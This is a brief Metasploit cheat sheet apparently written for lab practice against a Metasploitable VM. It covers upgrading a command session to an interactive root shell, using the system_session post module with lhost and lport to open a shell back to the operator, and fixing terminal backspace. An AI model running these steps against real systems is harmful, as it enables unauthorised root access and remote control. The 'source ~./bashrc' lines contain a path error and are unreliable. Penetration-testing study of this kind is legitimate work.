# Metasploit

## 01 - Interactive Meta Shell

Make the Meta shell fully interactive. To make full use with other commands such as, `passwd` and `su [username]`.

```
[*] Command shell session 1 opened (10.0.2.4:34869 -> 192.168.56.106:6200 ) at 2022-03-29 03:43:52 -0400

shell
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
root@metasploitable:/# id
id
uid=0(root) gid=0(root)
root@metasploitable:/#
```

## 02 - Post Module

```
msf > use post/multi/manage/system_session

msf post(multi/manage/system_session) > options

msf post(multi/manage/system_session) > set session <session_ID>

msf post(multi/manage/system_session) > set type <auto | ruby | python | perl | bash>

msf post(multi/manage/system_session) > set handler <false | true>

msf post(multi/manage/system_session) > set lhost <IP>

msf post(multi/manage/system_session) > set lport <PORT>

msf post(multi/manage/system_session) > run
```

## 03 - Troubleshooting

Fix backspace.

```
$ echo 'stty erase ^H' >> ~/.bashrc

$ echo 'stty erase ^H' >> ~/.zshrc
```

Reset resource file.

```
$ source ~./bashrc

$ source ~./zshrc
```